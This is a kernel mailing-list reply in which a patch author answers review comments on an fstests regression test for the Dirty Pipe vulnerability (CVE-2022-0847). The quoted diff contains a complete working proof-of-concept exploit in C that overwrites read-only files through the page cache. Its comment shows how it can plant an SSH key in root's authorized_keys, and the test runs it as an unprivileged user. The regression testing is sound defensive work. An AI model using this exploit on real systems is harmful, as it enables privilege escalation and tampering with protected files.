Return-Path: <fstests-owner@kernel.org>
X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
	aws-us-west-2-korg-lkml-1.web.codeaurora.org
Received: from vger.kernel.org (vger.kernel.org [23.128.96.18])
	by smtp.lore.kernel.org (Postfix) with ESMTP id 69556C433EF
	for <linux-fstests@archiver.kernel.org>; Tue,  8 Mar 2022 19:02:32 +0000 (UTC)
Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
        id S241039AbiCHTD1 (ORCPT
        <rfc822;linux-fstests@archiver.kernel.org>);
        Tue, 8 Mar 2022 14:03:27 -0500
Received: from lindbergh.monkeyblade.net ([23.128.96.19]:40404 "EHLO
        lindbergh.monkeyblade.net" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
        with ESMTP id S236858AbiCHTD1 (ORCPT
        <rfc822;fstests@vger.kernel.org>); Tue, 8 Mar 2022 14:03:27 -0500
Received: from us-smtp-delivery-124.mimecast.com (us-smtp-delivery-124.mimecast.com [170.10.129.124])
        by lindbergh.monkeyblade.net (Postfix) with ESMTP id 803A3E59
        for <fstests@vger.kernel.org>; Tue,  8 Mar 2022 11:02:29 -0800 (PST)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=redhat.com;
        s=mimecast20190719; t=1646766148;
        h=from:from:reply-to:subject:subject:date:date:message-id:message-id:
         to:to:cc:cc:mime-version:mime-version:content-type:content-type:
         in-reply-to:in-reply-to:references:references;
        bh=rLp/9A92jCgSQQYigiMTBZWV1eYSOqSYSiNEr1EJZfg=;
        b=EWGhaHIyOv2WuL5PE2MqWeEiLa5DqRsg/gBZHLd8m5jn4jAfGE1pF2Q7MRDvR5ewZarEnf
        vfb/BV/ywzCuKvsiahHRKQ0/pCxaXVFJJrG12tOl/sn7CFKWYhT/r6i3tuMl4Te4lT71+K
        4hgVXHGN7nD15GQU8lZlFxGjVrboPSM=
Received: from mail-pj1-f70.google.com (mail-pj1-f70.google.com
 [209.85.216.70]) by relay.mimecast.com with ESMTP with STARTTLS
 (version=TLSv1.2, cipher=TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384) id
 us-mta-635-LQ0TMleOM9-PYX1R8CoBSQ-1; Tue, 08 Mar 2022 14:02:27 -0500
X-MC-Unique: LQ0TMleOM9-PYX1R8CoBSQ-1
Received: by mail-pj1-f70.google.com with SMTP id e7-20020a17090a4a0700b001bc5a8c533eso103506pjh.4
        for <fstests@vger.kernel.org>; Tue, 08 Mar 2022 11:02:26 -0800 (PST)
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20210112;
        h=x-gm-message-state:date:from:to:cc:subject:message-id
         :mail-followup-to:references:mime-version:content-disposition
         :in-reply-to;
        bh=rLp/9A92jCgSQQYigiMTBZWV1eYSOqSYSiNEr1EJZfg=;
        b=iZp7KBVb4J9Ic/lXUEqWj2uqsV71Tdou92bjuvyVxN9zd14fugnq0FEVu4ojJ0sstO
         he74QNEWUoG9YcM7WDNIqznk6SKDYfF7Ya9piw0GDab3llSWWD47bdK2jX0rie0p8f4/
         kCYM7AyQMVrs9iCP0c7dknS3XOgXORpNFJ9EnV4zXznKwUMB01nf81l31fUhyWgFSpSG
         1xh3fK6LFwtCFGSM5UB/lTQUTU8jky1j4nz9es/RGXebwgkaxtF8WmvNmZKbhVQheq4x
         6RG9zxyOnrq66Y6I/2Md0ys7W9SHJ6ErC6lsbKXHFXq6YKX+xju7SoeGWy8dbgUTucE2
         a24w==
X-Gm-Message-State: AOAM530O228pvQYjhxksVHr9uI2NIvW9pALFqeeIUQ7urCkMm4B4WalS
        mzs5Zc6TJRo+s+PqS9J+0OapRn5A8nKqHvkRqeqnyFv6zCW+iivDnb58jya1I9C1CbduaoOe10K
        jlc56NWold5wisNuM2A==
X-Received: by 2002:a17:903:248:b0:14f:139f:191f with SMTP id j8-20020a170903024800b0014f139f191fmr18727564plh.71.1646766145234;
        Tue, 08 Mar 2022 11:02:25 -0800 (PST)
X-Google-Smtp-Source: ABdhPJwnEAk5mdS4FXPQK1KIUKYVYJHgtZMEUxaavM2QgLLSU0CHnLrUuTZlF0nXBpy9VuKYpKmnKw==
X-Received: by 2002:a17:903:248:b0:14f:139f:191f with SMTP id j8-20020a170903024800b0014f139f191fmr18727527plh.71.1646766144738;
        Tue, 08 Mar 2022 11:02:24 -0800 (PST)
Received: from zlang-mailbox ([209.132.188.80])
        by smtp.gmail.com with ESMTPSA id mw7-20020a17090b4d0700b001b8baf6b6f5sm3776079pjb.50.2022.03.08.11.02.22
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Tue, 08 Mar 2022 11:02:24 -0800 (PST)
Date:   Wed, 9 Mar 2022 03:02:19 +0800
From:   Zorro Lang <zlang@redhat.com>
To:     "Darrick J. Wong" <djwong@kernel.org>
Cc:     fstests@vger.kernel.org, max.kellermann@ionos.com
Subject: Re: [PATCH] fstests: test dirty pipe vulnerability issue of
 CVE-2022-0847
Message-ID: <20220308190219.kohodxq4bndpduwk@zlang-mailbox>
Mail-Followup-To: "Darrick J. Wong" <djwong@kernel.org>,
        fstests@vger.kernel.org, max.kellermann@ionos.com
References: <20220308092248.786739-1-zlang@redhat.com>
 <20220308171429.GB117704@magnolia>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Disposition: inline
In-Reply-To: <20220308171429.GB117704@magnolia>
Precedence: bulk
List-ID: <fstests.vger.kernel.org>
X-Mailing-List: fstests@vger.kernel.org

On Tue, Mar 08, 2022 at 09:14:29AM -0800, Darrick J. Wong wrote:
> On Tue, Mar 08, 2022 at 05:22:48PM +0800, Zorro Lang wrote:
> > Test for the Dirty Pipe vulnerability (CVE-2022-0847) caused by an
> > uninitialized  "pipe_buffer.flags" variable. The bug cause a file
> > can be overwritten even if a user/process is not permitted to write
> > it. It's fixed by 9d2231c5d74e ("lib/iov_iter: initialize "flags" in
> > new pipe_buffer").
> > 
> > Cc: Max Kellermann <max.kellermann@ionos.com>
> > Signed-off-by: Zorro Lang <zlang@redhat.com>
> > ---
> > 
> > Hi,
> > 
> > As the CVE-2022-0847 "Dirty Pipe Vulnerability" is public now, to cover this
> > bug testing, I write this case to fstests.
> > The main test program comes from Max Kellermann(https://dirtypipe.cm4all.com/),
> > I just changed it a little bit, then help it run with xfstests frame.
> > 
> > Please help to review, and feel free to tell me if it's not good to be in fstests.
> > 
> > Thanks,
> > Zorro
> > 
> >  .gitignore            |   1 +
> >  src/Makefile          |   2 +-
> >  src/splice2pipe.c     | 155 ++++++++++++++++++++++++++++++++++++++++++
> >  tests/generic/676     |  47 +++++++++++++
> >  tests/generic/676.out |   9 +++
> >  5 files changed, 213 insertions(+), 1 deletion(-)
> >  create mode 100644 src/splice2pipe.c
> >  create mode 100755 tests/generic/676
> >  create mode 100644 tests/generic/676.out
> > 
> > diff --git a/.gitignore b/.gitignore
> > index ba0c572b..a05c6058 100644
> > --- a/.gitignore
> > +++ b/.gitignore
> > @@ -125,6 +125,7 @@ tags
> >  /src/runas
> >  /src/seek_copy_test
> >  /src/seek_sanity_test
> > +/src/splice2pipe
> >  /src/splice-test
> >  /src/stale_handle
> >  /src/stat_test
> > diff --git a/src/Makefile b/src/Makefile
> > index 111ce1d9..7725c4aa 100644
> > --- a/src/Makefile
> > +++ b/src/Makefile
> > @@ -31,7 +31,7 @@ LINUX_TARGETS = xfsctl bstat t_mtab getdevicesize preallo_rw_pattern_reader \
> >  	dio-invalidate-cache stat_test t_encrypted_d_revalidate \
> >  	attr_replace_test swapon mkswap t_attr_corruption t_open_tmpfiles \
> >  	fscrypt-crypt-util bulkstat_null_ocount splice-test chprojid_fail \
> > -	detached_mounts_propagation ext4_resize
> > +	detached_mounts_propagation ext4_resize splice2pipe
> >  
> >  EXTRA_EXECS = dmerror fill2attr fill2fs fill2fs_check scaleread.sh \
> >  	      btrfs_crc32c_forged_name.py
> > diff --git a/src/splice2pipe.c b/src/splice2pipe.c
> > new file mode 100644
> > index 00000000..88b58f7e
> > --- /dev/null
> > +++ b/src/splice2pipe.c
> > @@ -0,0 +1,155 @@
> > +/* SPDX-License-Identifier: GPL-2.0 */
> > +/*
> > + * Copyright 2022 CM4all GmbH / IONOS SE
> > + *
> > + * author: Max Kellermann <max.kellermann@ionos.com>
> > + *
> > + * Proof-of-concept exploit for the Dirty Pipe
> > + * vulnerability (CVE-2022-0847) caused by an uninitialized
> > + * "pipe_buffer.flags" variable.  It demonstrates how to overwrite any
> > + * file contents in the page cache, even if the file is not permitted
> > + * to be written, immutable or on a read-only mount.
> > + *
> > + * This exploit requires Linux 5.8 or later; the code path was made
> > + * reachable by commit f6dd975583bd ("pipe: merge
> > + * anon_pipe_buf*_ops").  The commit did not introduce the bug, it was
> > + * there before, it just provided an easy way to exploit it.
> > + *
> > + * There are two major limitations of this exploit: the offset cannot
> > + * be on a page boundary (it needs to write one byte before the offset
> > + * to add a reference to this page to the pipe), and the write cannot
> > + * cross a page boundary.
> > + *
> > + * Example: ./write_anything /root/.ssh/authorized_keys 1 $'\nssh-ed25519 AAA......\n'
> > + *
> > + * Further explanation: https://dirtypipe.cm4all.com/
> > + */
> > +#ifndef _GNU_SOURCE
> > +#define _GNU_SOURCE
> > +#endif
> > +#include <unistd.h>
> > +#include <fcntl.h>
> > +#include <stdio.h>
> > +#include <stdlib.h>
> > +#include <string.h>
> > +#include <sys/stat.h>
> > +#include <sys/user.h>
> > +
> > +/**
> > + * Create a pipe where all "bufs" on the pipe_inode_info ring have the
> > + * PIPE_BUF_FLAG_CAN_MERGE flag set.
> > + */
> > +static void prepare_pipe(int p[2])
> > +{
> > +	if (pipe(p)) abort();
> 
> It would be a good idea to spit out the error that pipe() returns,
> even if the original POC didn't.

Sure, I'll change that.

> 
> > +
> > +	const unsigned pipe_size = fcntl(p[1], F_GETPIPE_SZ);
> > +	static char buffer[4096];
> 
> Also I'm sort of surprised that fstests' C compiler configuration allows
> declarations mixed with code, but ... fmeh, maybe I need to move on past
> 1989.

I surprised that too, I thought fstests compile with c89/c90 as linux kernel,
but looks like c89 isn't imposed in fstests building option. So I think it
might follow the default standard which current gcc use.
For example, in my system(rhel8), the manual of gcc says:

  gnu18
     GNU dialect of ISO C17.  This is the default for C code.

Then `info gcc` says:

  The default, if no C language dialect options are given, is
  '-std=gnu11'.

Sorry, I'm not familiar with this. If think about the compatibility, I
might be better to change the C code to c89 format?

> 
> > +
> > +	/* fill the pipe completely; each pipe_buffer will now have
> > +	   the PIPE_BUF_FLAG_CAN_MERGE flag */
> > +	for (unsigned r = pipe_size; r > 0;) {
> > +		unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
> > +		write(p[1], buffer, n);
> > +		r -= n;
> > +	}
> > +
> > +	/* drain the pipe, freeing all pipe_buffer instances (but
> > +	   leaving the flags initialized) */
> > +	for (unsigned r = pipe_size; r > 0;) {
> > +		unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
> > +		read(p[0], buffer, n);
> > +		r -= n;
> > +	}
> > +
> > +	/* the pipe is now empty, and if somebody adds a new
> > +	   pipe_buffer without initializing its "flags", the buffer
> > +	   will be mergeable */
> > +}
> > +
> > +int main(int argc, char **argv)
> > +{
> > +	if (argc != 4) {
> > +		fprintf(stderr, "Usage: %s TARGETFILE OFFSET DATA\n", argv[0]);
> > +		return EXIT_FAILURE;
> > +	}
> > +
> > +	/* dumb command-line argument parser */
> > +	const char *const path = argv[1];
> > +	loff_t offset = strtoul(argv[2], NULL, 0);
> > +	const char *const data = argv[3];
> > +	const size_t data_size = strlen(data);
> > +	int page_size = sysconf(_SC_PAGESIZE);
> > +	if (page_size == -1)
> > +		page_size = 4096;
> > +
> > +	if (offset % page_size == 0) {
> > +		fprintf(stderr, "Sorry, cannot start writing at a page boundary\n");
> > +		return EXIT_FAILURE;
> > +	}
> > +
> > +	const loff_t next_page = (offset | (page_size - 1)) + 1;
> > +	const loff_t end_offset = offset + (loff_t)data_size;
> > +	if (end_offset > next_page) {
> > +		fprintf(stderr, "Sorry, cannot write across a page boundary\n");
> > +		return EXIT_FAILURE;
> > +	}
> > +
> > +	/* open the input file and validate the specified offset */
> > +	const int fd = open(path, O_RDONLY); // yes, read-only! :-)
> > +	if (fd < 0) {
> > +		perror("open failed");
> > +		return EXIT_FAILURE;
> > +	}
> > +
> > +	struct stat st;
> > +	if (fstat(fd, &st)) {
> > +		perror("stat failed");
> > +		return EXIT_FAILURE;
> > +	}
> > +
> > +	if (offset > st.st_size) {
> > +		fprintf(stderr, "Offset is not inside the file\n");
> > +		return EXIT_FAILURE;
> > +	}
> > +
> > +	if (end_offset > st.st_size) {
> > +		fprintf(stderr, "Sorry, cannot enlarge the file\n");
> > +		return EXIT_FAILURE;
> > +	}
> > +
> > +	/* create the pipe with all flags initialized with
> > +	   PIPE_BUF_FLAG_CAN_MERGE */
> > +	int p[2];
> > +	prepare_pipe(p);
> > +
> > +	/* splice one byte from before the specified offset into the
> > +	   pipe; this will add a reference to the page cache, but
> > +	   since copy_page_to_iter_pipe() does not initialize the
> > +	   "flags", PIPE_BUF_FLAG_CAN_MERGE is still set */
> > +	--offset;
> > +	ssize_t nbytes = splice(fd, &offset, p[1], NULL, 1, 0);
> > +	if (nbytes < 0) {
> > +		perror("splice failed");
> > +		return EXIT_FAILURE;
> > +	}
> > +	if (nbytes == 0) {
> > +		fprintf(stderr, "short splice\n");
> > +		return EXIT_FAILURE;
> > +	}
> > +
> > +	/* the following write will not create a new pipe_buffer, but
> > +	   will instead write into the page cache, because of the
> > +	   PIPE_BUF_FLAG_CAN_MERGE flag */
> > +	nbytes = write(p[1], data, data_size);
> > +	if (nbytes < 0) {
> > +		perror("write failed");
> > +		return EXIT_FAILURE;
> > +	}
> > +	if ((size_t)nbytes < data_size) {
> > +		fprintf(stderr, "short write\n");
> > +		return EXIT_FAILURE;
> > +	}
> > +
> > +	return EXIT_SUCCESS;
> > +}
> > diff --git a/tests/generic/676 b/tests/generic/676
> > new file mode 100755
> > index 00000000..6092aac3
> > --- /dev/null
> > +++ b/tests/generic/676
> > @@ -0,0 +1,47 @@
> > +#! /bin/bash
> > +# SPDX-License-Identifier: GPL-2.0
> > +# Copyright (c) 2022 Red Hat, Inc.  All Rights Reserved.
> > +#
> > +# FS QA Test 676
> > +#
> > +# Test for the Dirty Pipe vulnerability (CVE-2022-0847) caused by an
> > +# uninitialized  "pipe_buffer.flags" variable, which fixed by:
> > +#   9d2231c5d74e ("lib/iov_iter: initialize "flags" in new pipe_buffer")
> > +#
> > +. ./common/preamble
> > +_begin_fstest auto quick
> > +
> > +# real QA test starts here
> > +_supported_fs generic
> > +_require_test
> > +_require_user
> > +_require_chmod
> > +_require_test_program "splice2pipe"
> > +
> > +localfile=$TEST_DIR/testfile.$seq
> > +
> > +# Create a file with 4k 0xff data, then make sure unprivileged user has readonly
> > +# permission on it
> > +$XFS_IO_PROG -f -t -c "pwrite 0 4k -S 0xff" $localfile >> $seqres.full 2>&1
> 
> I wonder, does this '4k' need to be $pagesize, or does it suffice to have
> any amount of written data, since that will get us a memory page?

From the testing, pagesize is not necessary to reproduce this bug at here. I can
reproduce this bug even if change 4k to 512.

> 
> Also, does _cleanup need to delete $localfile?

Sure

> 
> > +chmod 0644 $localfile
> > +# Test privileged user (xfstests generally run with root)
> > +echo "Test privileged user:"
> > +$here/src/splice2pipe $localfile 1 "AAAAAAAABBBBBBBB"
> > +# Part of 0xff will be overwritten if there's CVE-2022-0847 bug
> > +hexdump -C $localfile
> 
> (I wonder offhand if fstests ought to be checking for the existence of
> hexdump(1) since at least Debian only has it in bsdmainutils package,
> but ... that's a separate question.)

Hmm... I never thought about that, due to the hexdump is in util-linux for
rhel and fedora. That means it's nearly always be there. If Debian or some other
system won't have it by default, we might say 'hexdump' is a necessary dependence
to run fstests in doc :)


> 
> > +
> > +# Create a file with 4k 0xff data, then make sure unprivileged user has readonly
> > +# permission on it
> > +$XFS_IO_PROG -f -t -c "pwrite 0 4k -S 0xff" $localfile >> $seqres.full 2>&1
> > +chmod 0644 $localfile
> > +# Copy splice2pipe to a place which can be run by an unprivileged user (avoid
> > +# something likes /root/xfstests/src/splice2pipe)
> 
> What's wrong with /root/xfstests/src/ ?
> 
> Oh, I bet something in that path isn't readable by non-root, and hence
> the shell invoked by su won't be able to find the binary.

Yes, I clone the xfstests.git into home directory of root sometimes :-D

> 
> Looks good so far, modulo my questions. :)

Thanks for your reviewing! I'll send V2 soon.

Thanks,
Zorro

> 
> Thanks for putting together a regression test!
> 
> --D
> 
> > +cp $here/src/splice2pipe $tmp.splice2pipe
> > +# Test unprivileged user's privilege escalation
> > +echo "Test unprivileged user:"
> > +su ${qa_user} -c "$tmp.splice2pipe $localfile 1 AAAAAAAABBBBBBBB"
> > +hexdump -C $localfile
> > +
> > +# success, all done
> > +status=0
> > +exit
> > diff --git a/tests/generic/676.out b/tests/generic/676.out
> > new file mode 100644
> > index 00000000..f006e659
> > --- /dev/null
> > +++ b/tests/generic/676.out
> > @@ -0,0 +1,9 @@
> > +QA output created by 676
> > +Test privileged user:
> > +00000000  ff ff ff ff ff ff ff ff  ff ff ff ff ff ff ff ff  |................|
> > +*
> > +00001000
> > +Test unprivileged user:
> > +00000000  ff ff ff ff ff ff ff ff  ff ff ff ff ff ff ff ff  |................|
> > +*
> > +00001000
> > -- 
> > 2.31.1
> > 
> 

